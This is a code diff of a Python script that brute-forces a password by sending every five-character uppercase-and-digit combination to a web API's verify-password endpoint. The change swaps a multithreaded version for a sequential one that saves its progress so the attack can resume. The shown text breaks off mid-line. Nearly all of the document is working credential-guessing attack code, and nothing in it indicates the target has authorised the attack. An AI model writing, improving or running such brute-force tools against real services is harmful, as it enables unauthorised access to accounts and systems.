@@ -1,7 +1,7 @@
 import requests
 import string
+import os
 from itertools import product
-from concurrent.futures import ThreadPoolExecutor
 
 # API URL
 url = "https://secret.corgi.insure/api/verify-password"
@@ -9,49 +9,55 @@ url = "https://secret.corgi.insure/api/verify-password"
 # Characters to try: uppercase A-Z and digits 0-9
 characters = string.ascii_uppercase + string.digits
 
-# Function to check the password
-def check_password(combo):
-    password = ''.join(combo)
-    payload = {"password": password}
-    print(f"Trying: {password}")
+# File to store the last tried password
+last_password_file = "last_password.txt"
 
-    try:
-        # Make a POST request
-        response = requests.post(url, json=payload)
-        if response.status_code == 200 and response.json().get("success", False):
-            print(f"Password found: {password}")
-            return True
-    except requests.RequestException as e:
-        print(f"Request failed: {e}")
+def get_last_password():
+    """Load the last tried password from the file, if it exists."""
+    if os.path.exists(last_password_file):
+        with open(last_password_file, "r") as file:
+            return file.read().strip()
+    return None
 
-    return False
+def save_last_password(password):
+    """Save the last tried password to the file."""
+    with open(last_password_file, "w") as file:
+        file.write(password)
 
 def brute_force_password():
+    # Get the last tried password, if any
+    last_password = get_last_password()
+    start_found = False if last_password else True
+
     # Generate all combinations of 5 characters
-    combinations = product(characters, repeat=5)
+    for combo in product(characters, repeat=5):
+        password = ''.join(combo)
 
-    # Flag to start checking from AACZT
-    start_checking = False
+        # Skip until we find the last tried password
+        if not start_found:
+            if password == last_password:
+                start_found = True
+            continue
 
-    # Use ThreadPoolExecutor for parallel requests
-    with ThreadPoolExecutor(max_workers=10) as executor:  # You can adjust max_workers as needed
-        futures = {}
+        payload = {"password": password}
+        print(f"Trying password: {password}")
 
-        for combo in combinations:
-            if not start_checking:
-                if ''.join(combo) == "AACZT":
-                    start_checking = True
-                else:
-                    continue  # Skip until we reach AACZT
-
-            # Submit tasks for parallel execution
-            futures[executor.submit(check_password, combo)] = combo
-
-        for future in futures:
-            if future.result():  # If a password is found, exit
+        try:
+            # Make a POST request
+            response = requests.post(url, json=payload, timeout=5)
+            if response.status_code == 200 and response.json().get("success", False):
+                print(f"Password found: {password}")
                 return
+        except requests.RequestException as e:
+            print(f"Request failed: {e}")
+        
+        # Save the last tried password
+        save_last_password(password)
 
     print("Password not found.")
 
 # Run the script
-brute_force_password()
+if __name__ == "__main__":
+    try:
+        brute_force_password()
+    except Keyboard
